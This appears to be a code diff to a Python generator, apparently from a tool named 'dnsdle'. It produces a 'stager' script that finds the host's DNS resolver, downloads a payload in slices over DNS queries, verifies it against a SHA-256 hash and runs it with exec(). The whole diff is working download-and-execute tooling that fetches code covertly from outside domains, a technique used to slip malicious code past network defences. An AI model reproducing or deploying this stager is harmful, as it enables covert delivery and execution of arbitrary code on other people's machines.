@@ -1,7 +1,33 @@
 from __future__ import absolute_import, unicode_literals
 
-from dnsdle.client_template import _lift_resolver_source
+import os
+
 from dnsdle.state import StartupError
+
+
+def _read_resolver_source(filename):
+    sentinel = "# __TEMPLATE_SOURCE__"
+    source_dir = os.path.dirname(os.path.abspath(__file__))
+    filepath = os.path.join(source_dir, filename)
+    try:
+        with open(filepath, "r") as handle:
+            content = handle.read()
+    except Exception as exc:
+        raise StartupError(
+            "startup",
+            "generator_invalid_contract",
+            "cannot read resolver source file: %s" % exc,
+            {"filename": filename},
+        )
+    idx = content.find(sentinel)
+    if idx < 0:
+        raise StartupError(
+            "startup",
+            "generator_invalid_contract",
+            "sentinel not found in resolver source file",
+            {"filename": filename},
+        )
+    return content[idx + len(sentinel):]
 
 
 _STAGER_PREFIX = '''#!/usr/bin/env python
@@ -10,12 +36,13 @@ import base64
 import hashlib
 import hmac
 import random
+import re
 import socket
 import struct
+import subprocess
 import sys
 import time
 import zlib
-@@EXTRA_IMPORTS@@
 
 DOMAIN_LABELS = @@DOMAIN_LABELS@@
 FILE_TAG = @@FILE_TAG@@
@@ -29,6 +56,14 @@ SLICE_TOKEN_LEN = @@SLICE_TOKEN_LEN@@
 RESPONSE_LABEL = @@RESPONSE_LABEL@@
 DNS_EDNS_SIZE = @@DNS_EDNS_SIZE@@
 PSK = @@PSK@@
+DOMAINS_STR = @@DOMAINS_STR@@
+FILE_TAG_LEN = @@FILE_TAG_LEN@@
+
+PAYLOAD_PUBLISH_VERSION = @@PAYLOAD_PUBLISH_VERSION@@
+PAYLOAD_TOTAL_SLICES = @@PAYLOAD_TOTAL_SLICES@@
+PAYLOAD_COMPRESSED_SIZE = @@PAYLOAD_COMPRESSED_SIZE@@
+PAYLOAD_SHA256 = @@PAYLOAD_SHA256@@
+PAYLOAD_TOKEN_LEN = @@PAYLOAD_TOKEN_LEN@@
 
 
 # Ensure ASCII bytes
@@ -265,13 +300,101 @@ def _send_query(addr, pkt):
         except Exception:
             pass
     return resp
+
+
+_IPV4_RE = re.compile(r"(\\d{1,3}(?:\\.\\d{1,3}){3})")
+
+
+def _run_nslookup():
+    args = ["nslookup", "google.com"]
+    run_fn = getattr(subprocess, "run", None)
+    if run_fn is not None:
+        result = run_fn(
+            args,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            timeout=5,
+            universal_newlines=True,
+        )
+        return result.stdout or ""
+    proc = subprocess.Popen(
+        args,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        universal_newlines=True,
+    )
+    output, _ = proc.communicate()
+    return output or ""
+
+
+def _parse_nslookup_output(output):
+    lines = output.splitlines()
+    server_index = None
+    for index, line in enumerate(lines):
+        if line.strip().lower().startswith("server:"):
+            server_index = index
+            break
+    if server_index is None:
+        return None
+    for line in lines[server_index + 1:]:
+        stripped = line.strip()
+        if not stripped:
+            continue
+        if stripped.lower().startswith("non-authoritative answer"):
+            break
+        match = _IPV4_RE.search(stripped)
+        if match:
+            return match.group(1)
+    return None
+
+
+def _load_windows_resolvers():
+    try:
+        output = _run_nslookup()
+    except Exception:
+        return []
+    ip = _parse_nslookup_output(output)
+    if not ip:
+        return []
+    return [ip]
+
+
+def _load_unix_resolvers():
+    resolvers = []
+    try:
+        with open("/etc/resolv.conf", "r") as handle:
+            for raw_line in handle:
+                line = raw_line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                if "#" in line:
+                    line = line.split("#", 1)[0].strip()
+                    if not line:
+                        continue
+                parts = line.split()
+                if len(parts) < 2:
+                    continue
+                if parts[0].lower() != "nameserver":
+                    continue
+                host = parts[1].strip()
+                if not host:
+                    continue
+                if host not in resolvers:
+                    resolvers.append(host)
+    except Exception:
+        return []
+    return resolvers
+
 '''
 
 
 _STAGER_DISCOVER = '''
-
 def _discover_resolver():
-    for _h in @@LOADER_FN@@():
+    if sys.platform == "win32":
+        _hosts = _load_windows_resolvers()
+    else:
+        _hosts = _load_unix_resolvers()
+    for _h in _hosts:
         try:
             _ai = socket.getaddrinfo(_h, 53, socket.AF_INET, socket.SOCK_DGRAM)
             if _ai:
@@ -299,10 +422,9 @@ while _i < len(_sa):
         _i += 1
 if not psk:
     psk = PSK
-    _sa = ["--psk", psk] + list(_sa)
 if not resolver:
     addr = _discover_resolver()
-    _sa = ["--resolver", "%s:%d" % addr] + list(_sa)
+    resolver = "%s:%d" % addr
 else:
     host = resolver
     port = 53
@@ -340,28 +462,24 @@ if hashlib.sha256(plaintext).hexdigest().lower() != PLAINTEXT_SHA256_HEX:
 client_source = plaintext
 if not isinstance(client_source, str):
     client_source = client_source.decode("ascii")
-sys.argv = ["s"] + list(_sa)
+sys.argv = [
+    "c",
+    "--psk", psk,
+    "--domains", DOMAINS_STR,
+    "--mapping-seed", MAPPING_SEED,
+    "--publish-version", PAYLOAD_PUBLISH_VERSION,
+    "--total-slices", str(PAYLOAD_TOTAL_SLICES),
+    "--compressed-size", str(PAYLOAD_COMPRESSED_SIZE),
+    "--sha256", PAYLOAD_SHA256,
+    "--token-len", str(PAYLOAD_TOKEN_LEN),
+    "--file-tag-len", str(FILE_TAG_LEN),
+    "--response-label", RESPONSE_LABEL,
+    "--dns-edns-size", str(DNS_EDNS_SIZE),
+    "--resolver", resolver,
+]
 exec(client_source)
 '''
 
 
-def build_stager_template(target_os):
-    """Return the stager template source as a string for the given OS."""
-    if target_os == "linux":
-        extra_imports = ""
-        lifted = _lift_resolver_source("resolver_linux.py")
-        loader_fn = "_load_unix_resolvers"
-    elif target_os == "windows":
-        extra_imports = "import re\nimport subprocess"
-        lifted = _lift_resolver_source("resolver_windows.py")
-        loader_fn = "_load_windows_resolvers"
-    else:
-        raise StartupError(
-            "startup",
-            "generator_invalid_contract",
-            "unsupported target_os for stager template",
-            {"target_os": target_os},
-        )
-    discover = _STAGER_DISCOVER.replace("@@LOADER_FN@@", loader_fn)
-    template = _STAGER_PREFIX + lifted + discover + _STAGER_SUFFIX
-    return template.replace("@@EXTRA_IMPORTS@@", extra_imports)
+def build_stager_template():
+    return _STAGER_PREFIX + _STAGER_DISCOVER + _STAGER_SUFFIX
